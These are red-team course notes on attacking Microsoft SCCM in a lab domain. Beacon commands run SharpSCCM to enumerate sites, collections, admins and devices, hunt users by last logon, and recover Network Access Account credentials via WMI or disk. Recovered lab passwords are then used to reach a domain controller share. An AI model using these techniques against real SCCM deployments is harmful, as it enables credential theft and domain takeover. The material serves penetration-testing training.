# Configuration Manager

Microsoft Configuration Manager (aka ConfigMgr, MCM, or Systems Center Configuration Manager) is now under Microsoft's Intune brand umbrella. Most still refer to it as SCCM. Fundamentally, SCCM's role is to help with system management tasks such as software deployments, updates, and compliance configuration/reporting. The ability to connect multiple sites helps with scalability, particularly when dealing with different geographic locations. SCCM is an attractive target for attackers because given enough privilege, it can be used to push malicious scripts and applications to devices that it manages. 

The deployment in the RTO lab is only setup as a single site in order to demonstrate basic abuse primitives against Configuration Manager. There are other, including [this post](https://medium.com/specter-ops-posts/sccm-hierarchy-takeover-41929c61e087) that describes how a compromised primary site also compromises the entire hierarchy.

## Enumeration

First understand the deployment topology, which devices are being managed, and who the admins are. Given a foothold on a machine, begin by finding the management point and site code that it is linked to. This does not require any special privileges in the domain, in SCCM or on the endpoint.

    beacon> run hostname
    wkstn-2
    beacon> getuid
    [*] You are DEV\bfarmer
    beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner

This enumeration uses WMI under the hood, done manually is:

    beacon> powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl

Can also check the DACL on the CN=System Management container in AD for machines that have Full Control over it (as this a pre-requisite of SCCM setup in a domain):

    beacon> execute-assembly SharpSCCM.exe get site-info -d cyberbotic.io --no-banner

Enumerating users, groups, computers, collections, and administrators, etc, cannot be done as a standard domain user. SCCM employs RBAC. A description of each role [can be found here](https://learn.microsoft.com/en-us/mem/configmgr/core/understand/fundamentals-of-role-based-administration). The scope of these roles can be restricted to individual collections as needed by admin. For example, computers from the DEV and CYBER domains can be grouped into their own collections. This can really impact an attacker's view of how SCCM is configured. If we enumerate all the collections as one user, we can see that both DEV and CYBER exist as well as their member counts.

    beacon> getuid
    [*] You are DEV\bfarmer
    beacon> execute-assembly SharpSCCM.exe get collections --no-banner
    MemberCount: 4

However, if we run the same enumeration as jking, a member of DEV\Support Engineers, we only see the DEV collection:

    beacon> make_token DEV\jking Qwerty123
    [+] Impersonated DEV\jking (netonly)
    beacon> execute-assembly SharpSCCM.exe get collections --no-banner
    MemberCount: 6

because though DEV\Developers are only "Read-Only Analysts", the role is scoped to both collections. DEV\Support Engineers are "Full Administrators" over the DEV collection but they have no roles that are scoped to the CYBER collection. When enumerating SCCM, you may only see a portion based on the user you're running the enumeration as.

Administrative users can be found using get class-instances SMS_Admin; this shows what is reflected in the Configuration Manger GUI.

    beacon> execute-assembly SharpSCCM.exe get class-instances SMS_Admin --no-banner

Members of these collections can be found using get collection-members -n <collection-name>:

    beacon> execute-assembly SharpSCCM.exe get collection-members -n DEV --no-banner

More information on each device can be obtained using get devices. There are some good ways to filter the output, such as searching by device name, -n, and only displaying the properties specified by -p.

    beacon> execute-assembly SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner

Use SCCM as a form of user hunting, since it records the last user to login to each managed computer. The -u parameter will only return devices where the given user was the last to login:

    beacon> execute-assembly SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner

These results are updated in SCCM every 7 days by default.

## Network Access Account Credentials

In a Windows environment, most computers are domain-joined and authenticate to SCCM Software Distribution Points (SDPs) (SMB shares) using their credentials. Network Access Account credentials (NAAs) are domain credentials used by computers not domain-joined. They are passed to the machines as part of the SCCM machine policies, which are encrypted using DPAPI and stored locally. If present, privileged users can retrieve these credential blobs via WMI or directly from disk and decrypt them to recover plaintext credentials. Use local naa with -m wmi or -m disk:

    beacon> getuid
    [*] You are DEV\bfarmer (admin)
    beacon> execute-assembly SharpSCCM.exe local naa -m wmi --no-banner

These credentials should only have read access to the SDP, but are often times over privileged (sometimes even domain/enterprise admins).

    beacon> make_token cyberbotic.io\sccm_svc Cyberb0tic
    [+] Impersonated cyberbotic.io\sccm_svc (netonly)
    beacon> ls \\dc-1.cyberbotic.io\c$
   
Or request a copy of the policy directly from SCCM using ```get naa``` (requires LA to obtain a copy of its SMS Signing and SMS Encryption certs).

## 
